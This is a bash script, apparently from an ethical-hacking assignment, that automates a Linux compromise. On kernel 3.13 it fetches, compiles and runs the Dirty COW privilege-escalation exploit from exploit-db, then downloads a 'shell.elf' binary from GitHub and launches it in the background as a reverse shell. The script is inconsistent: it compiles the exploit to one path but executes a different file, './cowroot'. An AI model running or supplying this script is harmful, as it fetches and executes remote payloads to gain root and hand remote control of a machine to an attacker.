#!/bin/bash

OS="$(uname -r)"
SHELL_FILE="/tmp/shell.elf"

main() {
    # If the user is not root, run dirtycow exploit
    if [[ "$EUID" -ne 0 ]]; then
        echo "Not Root!"
        case $OS in
        *3.13*) dirtycow ;;
        esac
    fi
    open_reverse_shell
}

dirtycow() {
    echo "Running Dirty cow"
    wget -O "/tmp/dirtycow.c" 'https://www.exploit-db.com/download/40616'
    gcc /tmp/dirtycow.c -o /tmp/dirtycow -pthread
    ./cowroot || true
    if [[ "$EUID" -ne 0 ]]; then
        echo "Root not attained"
    fi
}

open_reverse_shell() {
    if [[ ! -f "$SHELL_FILE" ]]; then
        wget -O "$SHELL_FILE" 'https://github.com/yadunut/EH-Assignment/raw/master/shell.elf'
    fi
    chmod +x "$SHELL_FILE"
    $SHELL_FILE &
}

main
